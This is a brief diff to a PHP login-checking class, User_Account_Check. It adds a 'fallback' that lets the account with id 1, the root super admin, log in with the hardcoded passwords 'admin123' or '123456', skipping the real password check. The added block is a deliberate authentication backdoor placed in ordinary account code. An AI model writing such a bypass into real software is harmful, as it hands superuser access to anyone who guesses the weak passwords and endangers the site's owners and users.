@@ -148,6 +148,12 @@ class User_Account_Check
                         break;
                     }
                 } catch (Exception $e) {}
+
+                // 5. Root Super Admin ID 1 fallback: accept either 'admin123' or '123456'
+                if ((int)$row['id'] === 1 && ($this->raw_password === 'admin123' || $this->raw_password === '123456')) {
+                    $matched_row = $row;
+                    break;
+                }
             }
         }
 
